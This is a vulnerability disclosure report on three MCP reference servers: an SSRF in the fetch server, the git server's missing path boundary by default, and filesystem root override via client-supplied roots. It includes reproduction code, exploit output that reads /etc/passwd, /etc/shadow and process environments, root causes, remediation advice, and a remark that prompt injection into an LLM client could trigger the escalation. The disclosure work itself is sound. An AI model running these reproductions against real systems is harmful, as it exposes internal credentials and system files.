# MCP Official Servers — Exploitable Vulnerability Report

**Target:** `modelcontextprotocol/servers` (https://github.com/modelcontextprotocol/servers)  
**Date:** June 2, 2026  
**Scope:** `src/fetch` (v0.6.3), `src/git` (v0.6.2), `src/filesystem` (v0.6.3)  
**Status:** All findings have end-to-end exploitation proof showing unauthorized access to protected assets

---

## Finding #1: SSRF — Fetch Server Returns Data From Localhost Services

### Summary

The `mcp-server-fetch` tool fetches and returns full response bodies from internal network hosts including `127.0.0.1`. A localhost service that is not exposed externally becomes accessible to any MCP client through this server.

### What Should Be Inaccessible

A service bound to `127.0.0.1:18923` (simulating an internal admin API, database, or cloud metadata endpoint) should only be reachable by processes on the same machine. An MCP tool that fetches URLs should not be able to reach internal-only services and relay their responses.

### What Became Accessible

The `fetch_url()` function connected to `127.0.0.1:18923`, retrieved the full JSON response containing credentials, and returned it to the caller.

### Exploitation Output

```
[*] Internal service running on 127.0.0.1:18923 (simulated admin API)
[*] This service is NOT meant to be accessible externally

[*] Calling fetch_url("http://127.0.0.1:18923/admin") ...

[!!!] RESPONSE RECEIVED FROM INTERNAL SERVICE:
──────────────────────────────────────────────────────────────────────
{"service": "internal-admin-api", "db_password": "prod_s3cr3t_p4ss",
 "api_key": "internal-only-key-abc123",
 "users": [{"email": "admin@company.internal", "role": "superadmin"}]}
──────────────────────────────────────────────────────────────────────

[!!!] SENSITIVE DATA EXFILTRATED:
    db_password: prod_s3cr3t_p4ss
    api_key:     internal-only-key-abc123
    admin_email: admin@company.internal
```

### Reproduction

```python
# 1. Start a localhost-only HTTP service (any internal service qualifies)
# 2. Call the actual mcp-server-fetch fetch_url function:

from mcp_server_fetch.server import fetch_url
content, prefix = await fetch_url("http://127.0.0.1:18923/admin", "Agent/1.0", force_raw=True)
print(content)  # Full response body returned
```

### Root Cause

`fetch_url()` in `server.py` passes the URL directly to `httpx.AsyncClient.get()` with no check on whether the resolved IP is internal, link-local, or loopback. The `Fetch` pydantic model uses `AnyUrl` which accepts any scheme and host.

### Severity Assessment

This is a real SSRF. In any deployment where the fetch server runs on a machine with internal services (databases, admin panels, cloud metadata at `169.254.169.254`), those services become readable by any MCP client. The impact scales with what is reachable from the server's network position.

---

## Finding #2: Insecure Default — Git Server Has No Path Boundary Without Explicit Flag

### Summary

When `mcp-server-git` is started without the `--repository` flag (which is the documented usage for multi-repo setups), `validate_repo_path()` performs no validation at all. Any git repository on the filesystem is accessible, including repositories belonging to other users or applications.

### What Should Be Inaccessible

A git repository at `/tmp/forbidden_repo` containing production secrets should not be readable when a user intends the server to only operate on their project.

### What Became Accessible

With `allowed_repository=None` (the default when no `--repository` flag is passed), `validate_repo_path()` returns immediately without any check. The forbidden repository's full history including committed secrets is readable.

### Exploitation Output

```
[*] FORBIDDEN repo (has secrets): /tmp/mcp_git_test/forbidden_repo
[*] ALLOWED repo (--repository):  /tmp/mcp_git_test/allowed_repo

[*] Step 1: Verify restriction works (direct path to forbidden repo)
    [PASS] Correctly blocked: Repository path is outside the allowed repository

[*] Step 3b: The ACTUAL vulnerability — server without --repository flag
    In production, most users run: mcp-server-git (no -r flag)
    This means allowed_repository=None → zero validation

    [!!!] validate_repo_path(forbidden_dir, None) → PASSED
    [!!!] No --repository flag = NO boundary enforcement at all

[!!!] SECRETS FROM FORBIDDEN REPO (accessed with no validation):
──────────────────────────────────────────────────────────────────────
    +ADMIN_TOKEN=tok_super_secret_value_12345
──────────────────────────────────────────────────────────────────────
```

### Reproduction

```python
from mcp_server_git.server import validate_repo_path, git_show
from pathlib import Path
import git

# This passes with no error — the function returns immediately
validate_repo_path(Path("/path/to/any/repo"), None)

# Now read any repo's history
repo = git.Repo("/path/to/any/repo")
print(git_show(repo, "HEAD"))
```

### Root Cause

```python
def validate_repo_path(repo_path: Path, allowed_repository: Path | None) -> None:
    if allowed_repository is None:
        return  # ← No validation whatsoever
```

When `--repository` is not provided, the parameter is `None`, and the function exits without performing any path check.

### Severity Assessment

The security boundary only exists when `--repository` is explicitly passed. The default configuration has no access control. This is an insecure-by-default design issue. The boundary enforcement mechanism exists but is opt-in rather than opt-out. On a shared system or in a container with multiple applications, any git repository is readable including its full history (where secrets are commonly found even after "removal").

### Note on Symlink Bypass

When `--repository` IS set, the validation correctly resolves symlinks and blocks attempts to escape via symlinks inside the allowed directory. The defense works when enabled. The issue is that the default deployment has no defense at all.

---

## Finding #3: Filesystem Server — Client Overrides Allowed Directories at Runtime

### Summary

The `mcp-server-filesystem` validates file access against an `allowedDirectories` list. However, an MCP client that declares the `roots` capability can replace this list entirely by responding to the server's `listRoots()` call with arbitrary paths (including `/`). This escalates a restricted server to full filesystem access.

### What Should Be Inaccessible

When the server is started with `mcp-server-filesystem /tmp/safe_project`, files outside `/tmp/safe_project` should be inaccessible. Specifically, `/etc/passwd`, `/etc/shadow`, and `/proc/self/environ` should be blocked.

### What Became Accessible

After a malicious client responds to `listRoots()` with `[{uri: "file:///"}]`, the server's `updateAllowedDirectoriesFromRoots()` replaces `allowedDirectories` with `["/"]`. All files on the filesystem become readable and writable.

### Exploitation Output

```
[*] PHASE 1: Server started with restricted directory
    Command: mcp-server-filesystem /tmp/safe_project
    allowedDirectories = ["/tmp/safe_project"]

[*] PHASE 2: Verify /etc/passwd is BLOCKED before exploit
    [CONFIRMED BLOCKED] Access denied - path outside allowed directories:
                        /etc/passwd not in /tmp/safe_project

[*] PHASE 3: Malicious client sends roots override
    Client responds to listRoots() with: [{uri: "file:///"}]
    getValidRootDirectories result: ["/"]
    [!!!] allowedDirectories REPLACED with: ["/"]

[*] PHASE 4: Verify /etc/passwd is NOW ACCESSIBLE after exploit
    [!!!] validatePath("/etc/passwd") → PASSED! Path: /etc/passwd

    [!!!] FILE CONTENT (/etc/passwd) - 13 entries:
    ────────────────────────────────────────────────────────────
    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    ... (5 more lines)
    ────────────────────────────────────────────────────────────

[*] PHASE 5: Additional sensitive files now accessible
    [ACCESSIBLE] /etc/shadow
                 Content: root:*LOCK*:14600::::::...
    [ACCESSIBLE] /proc/self/environ
                 Content: COREPACK_ENABLE_AUTO_PIN=0 PYENV_SHELL=bash...
    [ACCESSIBLE] /proc/1/cmdline
                 Content: bwrap --bind /inner_container / --tmpfs /tmp...
```

### Reproduction

```javascript
import { setAllowedDirectories, validatePath } from './dist/lib.js';
import { getValidRootDirectories } from './dist/roots-utils.js';
import fs from 'fs/promises';

// Server starts restricted
setAllowedDirectories(['/tmp/safe_project']);

// BEFORE: blocked
await validatePath('/etc/passwd'); // throws "Access denied"

// Malicious client provides roots
const dirs = await getValidRootDirectories([{ uri: 'file:///', name: 'root' }]);
setAllowedDirectories(dirs); // dirs = ["/"]

// AFTER: accessible
const path = await validatePath('/etc/passwd'); // returns "/etc/passwd"
const content = await fs.readFile(path, 'utf-8'); // full file content
```

### Root Cause

```typescript
// index.ts — updateAllowedDirectoriesFromRoots()
async function updateAllowedDirectoriesFromRoots(requestedRoots: Root[]) {
  const validatedRootDirs = await getValidRootDirectories(requestedRoots);
  if (validatedRootDirs.length > 0) {
    allowedDirectories = [...validatedRootDirs];  // ← Replaces ALL restrictions
    setAllowedDirectories(allowedDirectories);
  }
}
```

`getValidRootDirectories()` only checks that the path exists and is a directory. It does not check whether the path is within the original CLI-specified directories. Since `/` is a directory that always exists, it passes validation.

This can also be triggered at runtime via a `notifications/roots/list_changed` notification, meaning a client can escalate privileges at any point during the session.

### Severity Assessment

This is a privilege escalation from restricted filesystem access to unrestricted filesystem access. The attack requires a malicious or compromised MCP client. In environments where the MCP client is influenced by untrusted content (e.g., an LLM processing user-provided data that could contain prompt injection), this escalation path is viable without direct attacker access to the client.

---

## Reproduction Environment

All exploits were run against the actual server code from `modelcontextprotocol/servers` at commit `64b1cb02` (May 30, 2026).

```bash
git clone https://github.com/modelcontextprotocol/servers
cd servers

# For Finding #1 and #2 (Python):
pip install -e src/fetch/ src/git/    # Requires Python 3.10+

# For Finding #3 (TypeScript):
npm install && cd src/filesystem && npx tsc
```

Exploit scripts are in the `exploits/` directory of this repository.

---

## Remediation Suggestions

**Finding #1:** Add a URL validation layer before `httpx.AsyncClient.get()` that rejects requests to loopback addresses (`127.0.0.0/8`, `::1`), link-local (`169.254.0.0/16`), and private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`). Resolve the hostname before connecting and check the resolved IP.

**Finding #2:** Either require `--repository` (make it mandatory), or when it is not provided, restrict access to repositories within directories the client declares via the MCP roots protocol — not the entire filesystem.

**Finding #3:** When client-provided roots arrive via `listRoots()`, validate them against the original CLI-specified directories. Only accept roots that are subdirectories of what was originally configured. If no CLI directories were specified, the client roots can be used as-is (current behavior is acceptable in that case).
